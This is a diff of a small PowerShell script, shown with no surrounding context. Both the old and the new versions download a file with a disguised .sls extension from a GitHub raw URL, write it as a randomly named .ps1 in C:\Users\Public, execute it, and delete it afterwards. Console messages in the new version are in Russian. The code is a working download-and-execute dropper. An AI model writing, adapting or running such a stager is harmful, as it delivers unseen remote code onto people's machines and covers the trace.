@@ -1,24 +1,19 @@
-$url = "raw.githubusercontent.com/robotinsideus12/trust/refs/heads/main/new.sls"
-$randomFileName = (Get-Random).ToString() + ".ps1"
-$filePath = Join-Path -Path "C:\Users\Public" -ChildPath $randomFileName
-Write-Host "file created $filePath"
+$url = "https://raw.githubusercontent.com/robotinsideus12/cl/refs/heads/main/new.sls"
+$tempFile = "C:\Users\Public\temp_$(Get-Random).ps1"
+
 try {
 
-    Invoke-RestMethod -Uri $url | Set-Content -Path $filePath
-
-
-    & $filePath
+    $client = New-Object System.Net.WebClient
+    $client.DownloadFile($url, $tempFile)
     
-    Write-Host "scrypt started"
-}
-catch {
-
-    Write-Error "error: $($_.Exception.Message)"
-}
-finally {
-
-    if (Test-Path $filePath) {
-        Remove-Item $filePath
-        Write-Host "tmp '$filePath' del."
+    if (Test-Path $tempFile) {
+        & $tempFile
+        Write-Host "Скрипт выполнен успешно"
+    }
+} catch {
+    Write-Error "Ошибка: $($_.Exception.Message)"
+} finally {
+    if (Test-Path $tempFile) {
+        Remove-Item $tempFile -ErrorAction SilentlyContinue
     }
 }
